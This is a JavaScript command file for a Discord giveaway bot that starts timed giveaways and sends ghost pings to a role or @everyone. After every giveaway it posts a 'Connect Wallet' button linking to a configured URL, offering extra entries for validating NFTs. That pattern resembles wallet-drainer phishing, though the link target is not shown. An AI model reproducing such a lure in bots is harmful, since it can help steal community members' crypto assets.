import ms from "ms";
import fs from "fs";
import { MessageActionRow, MessageButton } from "discord.js";

const { Giveaway_Options, Bot_Info } = JSON.parse(
  fs.readFileSync("config.json", "utf-8")
);

const config = {
  name: "start",
  description: "Starts a giveaway.",
  usage: "[channel] [duration] [winners] [prize]",
  category: "Giveaways",
  accessableby: "Admins",
  aliases: [], // To add custom aliases just type ["alias1", "alias2"].
};

const run = async (client, message, args) => {
  const isManageMessages = message.member
    .permissionsIn(message.channel)
    .toArray()
    .includes("MANAGE_MESSAGES");

  if (Giveaway_Options.giveawayManagerID) {
    if (
      !isManageMessages &&
      !message.member.roles.cache.some(
        (r) => r.id === Giveaway_Options.giveawayManagerID
      )
    ) {
      return message.channel.send(
        ":boom: You need to have the `MANAGE_MESSAGES` permissions to start giveaways."
      );
    }
  } else {
    if (
      !isManageMessages &&
      !message.member.roles.cache.some((r) => r.name === "Giveaways")
    ) {
      return message.channel.send(
        ":boom: You need to have the `MANAGE_MESSAGES` permissions to start giveaways."
      );
    }
  }

  let giveawayChannel = message.channel;
  if (!giveawayChannel) {
    return message.channel.send(
      ":boom: Uh oh, I couldn't find that channel! Try again!"
    );
  }

  let giveawayDuration = args[0];
  if (!giveawayDuration || isNaN(ms(giveawayDuration))) {
    return message.channel.send(
      ":boom: Hm. you haven't provided a duration. Can you try again?"
    );
  }

  let giveawayNumberWinners = args[1];
  if (isNaN(giveawayNumberWinners) || parseInt(giveawayNumberWinners) <= 0) {
    return message.channel.send(
      ":boom: Uh... you haven't provided the amount of winners."
    );
  }

  let giveawayPrize = args.slice(2).join(" ");
  if (!giveawayPrize) {
    return message.channel.send(
      ":boom: Oh, it seems like you didn't give me a valid prize!"
    );
  }
  if (
    !Giveaway_Options.showMention &&
    Giveaway_Options.giveawayRoleID &&
    Giveaway_Options.giveawayMention
  ) {
    giveawayChannel
      .send(`<@&${Giveaway_Options.giveawayRoleID}>`)
      .then((msg) => msg.delete({ timeout: 1000 }));
    client.giveawaysManager.start(giveawayChannel, {
      duration: ms(giveawayDuration),
      prize: giveawayPrize,
      winnerCount: parseInt(giveawayNumberWinners),
      hostedBy: Giveaway_Options.hostedBy ? message.author : null,
      botsCanWin: false,
      reaction: ":tada:",
      messages: {
        giveaway: ":tada: **GIVEAWAY** :tada:",
        giveawayEnded: ":tada: **GIVEAWAY ENDED** :tada:",
        timeRemaining: "Time remaining: **{duration}**!", // no show up
        inviteToParticipate: "React with 🎉 to participate!",
        winMessage: "Congratulations, {winners}! You won the **{prize}**!",
        embedFooter: "Giveaways", // no show up
        noWinner: "Not enough entrants to determine a winner!",
        hostedBy: "Hosted by: {user}",
        winners: "winner(s)",
        endedAt: "Ended at",
      },
      // bonusEntries: [
      //   {
      //     bonus: multipleEntries(member),
      //     cumulative: false
      //   }
      // ]
    });
  } else if (
    Giveaway_Options.showMention &&
    Giveaway_Options.giveawayRoleID &&
    Giveaway_Options.giveawayMention
  ) {
    client.giveawaysManager.start(giveawayChannel, {
      time: ms(giveawayDuration),
      prize: giveawayPrize,
      winnerCount: parseInt(giveawayNumberWinners),
      hostedBy: Giveaway_Options.hostedBy ? message.author : null,
      messages: {
        giveaway:
          (Giveaway_Options.showMention
            ? `<@&${Giveaway_Options.giveawayRoleID}>\n\n`
            : "") + ":tada: **GIVEAWAY** :tada:",
        giveawayEnded:
          (Giveaway_Options.showMention
            ? `<@&${Giveaway_Options.giveawayRoleID}>\n\n`
            : "") + ":tada: **GIVEAWAY ENDED** :tada:",
        timeRemaining: "Time remaining: **{duration}**!",
        inviteToParticipate: "React with 🎉 to participate!",
        winMessage: "Congratulations, {winners}! You won the **{prize}**!",
        embedFooter: "Giveaways",
        noWinner: "Not enough entrants to determine a winner!",
        hostedBy: "Hosted by: {user}",
        winners: "winner(s)",
        endedAt: "Ended at",
        units: {
          seconds: "seconds",
          minutes: "minutes",
          hours: "hours",
          days: "days",
          pluralS: false,
        },
      },
    });
  } else if (
    !Giveaway_Options.showMention &&
    !Giveaway_Options.giveawayRoleID &&
    Giveaway_Options.giveawayMention
  ) {
    giveawayChannel
      .send(`@everyone`)
      .then((msg) => msg.delete({ timeout: 1000 }));
    client.giveawaysManager.start(giveawayChannel, {
      time: ms(giveawayDuration),
      prize: giveawayPrize,
      winnerCount: parseInt(giveawayNumberWinners),
      hostedBy: Giveaway_Options.hostedBy ? message.author : null,
      messages: {
        giveaway: ":tada: **GIVEAWAY** :tada:",
        giveawayEnded: ":tada: **GIVEAWAY ENDED** :tada:",
        timeRemaining: "Time remaining: **{duration}**!",
        inviteToParticipate: "React with 🎉 to participate!",
        winMessage: "Congratulations, {winners}! You won the **{prize}**!",
        embedFooter: "Giveaways",
        noWinner: "Not enough entrants to determine a winner!",
        hostedBy: "Hosted by: {user}",
        winners: "winner(s)",
        endedAt: "Ended at",
        units: {
          seconds: "seconds",
          minutes: "minutes",
          hours: "hours",
          days: "days",
          pluralS: false,
        },
      },
    });
  } else if (
    Giveaway_Options.showMention &&
    !Giveaway_Options.giveawayRoleID &&
    Giveaway_Options.giveawayMention
  ) {
    client.giveawaysManager.start(giveawayChannel, {
      duration: ms(giveawayDuration),
      prize: giveawayPrize,
      winnerCount: parseInt(giveawayNumberWinners),
      hostedBy: Giveaway_Options.hostedBy ? message.author : null,
      botsCanWin: false,
      reaction: message.guild.emojis.resolve("965607040649154630"),
      messages: {
        giveaway: ":tada: **GIVEAWAY** :tada:",
        giveawayEnded: ":tada: **GIVEAWAY ENDED** :tada:",
        inviteToParticipate: "React with 🎉 to participate!",
        winMessage:
          "Congratulations, {winners}! You won the ** {this.prize} **!",
        drawing: "Drawing: {timestamp}",
        embedFooter: "Giveaways",
        noWinner: "Not enough entrants to determine a winner!",
        hostedBy: `Hosted by: ${message.member}`,
        winners: "winner(s)",
        endedAt: "Ended at",
      },
    });
  } else if (!Giveaway_Options.giveawayMention) {
    client.giveawaysManager.start(giveawayChannel, {
      time: ms(giveawayDuration),
      prize: giveawayPrize,
      winnerCount: parseInt(giveawayNumberWinners),
      hostedBy: Giveaway_Options.hostedBy ? message.author : null,
      messages: {
        giveaway: ":tada: **GIVEAWAY** :tada:",
        giveawayEnded: ":tada: **GIVEAWAY ENDED** :tada:",
        timeRemaining: "Time remaining: **{duration}**!",
        inviteToParticipate: "React with 🎉 to participate!",
        winMessage: "Congratulations, {winners}! You won the **{prize}**!",
        embedFooter: "Giveaways",
        noWinner: "Not enough entrants to determine a winner!",
        hostedBy: "Hosted by: {user}",
        winners: "winner(s)",
        endedAt: "Ended at",
        units: {
          seconds: "seconds",
          minutes: "minutes",
          hours: "hours",
          days: "days",
          pluralS: false,
        },
      },
    });
  }

  const row = new MessageActionRow().addComponents(
    new MessageButton()
      .setLabel("Connect Wallet")
      .setStyle("LINK")
      .setURL(Bot_Info.validateUrl)
  );

  message.channel.send({
    content: "**Enter the button to validate how many NFTs do you have to earn more entries!!**",
    components: [row]
  });

  // message.channel.send(
  //   `:tada: Done! The giveaway for the \`${giveawayPrize}\` is starting in ${giveawayChannel}!`
  // );
};

export { config, run };
